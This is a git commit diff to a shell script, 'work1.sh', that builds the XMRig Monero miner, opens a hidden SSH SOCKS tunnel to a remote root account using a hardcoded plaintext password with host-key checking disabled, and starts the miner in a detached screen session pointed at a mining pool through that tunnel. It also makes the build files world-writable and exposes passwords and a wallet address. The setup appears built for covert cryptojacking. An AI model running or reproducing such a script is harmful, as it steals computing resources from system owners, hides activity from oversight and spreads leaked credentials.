72a683e0a7e4d1ee61c8b6d3909e5c3711e6e1b9
manhinh24inch <40003346+manhinh24inch@users.noreply.github.com>
2021-05-11 00:33:54 +0800

    Update work1.sh

--- work1.sh
+++ work1.sh
@@ -7,5 +7,6 @@ mkdir xmrig/build && cd xmrig/scripts
 cmake .. -DXMRIG_DEPS=scripts/deps
 make -j$(nproc)
 sudo chmod 777 *
-screen -d -m sshpass -p fM7)n+31MMMhE%!_ ssh -o StrictHostKeyChecking=no -D 1997 root@207.148.101.207
-screen -d -m ./xmrig -o pool.minexmr.com:4444 -u 859HoAtW19PT8SmdjuMJ3DTqbZKFv8DFu7DYtk6wJm3YKrAJKTVeRDkZNq8fPseEz4D7KRBwkfGcHE73XKYYAhguEBH8w5X.test_03 -x socks4://127.0.0.1:1997
+sudo apt install sshpass
+sudo screen -d -m sshpass -p dramz68682021 ssh -o StrictHostKeyChecking=no -D 1997 root@congdao.ddns.net
+sudo screen -d -m ./xmrig -o bedao.ddns.net:4444 -u 859HoAtW19PT8SmdjuMJ3DTqbZKFv8DFu7DYtk6wJm3YKrAJKTVeRDkZNq8fPseEz4D7KRBwkfGcHE73XKYYAhguEBH8w5X.testmoi_02 -x socks4://127.0.0.1:1997
